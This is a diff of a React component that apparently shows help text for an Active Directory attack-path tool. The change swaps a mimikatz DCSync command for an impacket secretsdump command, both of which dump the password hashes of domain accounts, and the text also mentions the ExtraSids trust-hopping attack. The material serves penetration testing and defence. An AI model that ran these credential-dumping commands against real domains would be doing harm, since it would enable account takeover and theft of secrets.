@@ -1,19 +1,21 @@
 import React from 'react';
 
-const Abuse = () => {
+const LinuxAbuse = () => {
     return (
         <>
             <p>
                 You may perform a dcsync attack to get the password hash of an
-                arbitrary principal using mimikatz:
+                arbitrary principal using impacket's secretsdump.py example script:
             </p>
+
             <pre>
-                <code>
-                    {
-                        'lsadump::dcsync /domain:testlab.local /user:Administrator'
-                    }
-                </code>
+                    <code>
+                        {
+                            "secretsdump 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"
+                        }
+                    </code>
             </pre>
+
             <p>
                 You can also perform the more complicated ExtraSids attack to
                 hop domain trusts. For information on this see the blog post by
@@ -23,4 +25,4 @@ const Abuse = () => {
     );
 };
 
-export default Abuse;
+export default LinuxAbuse;
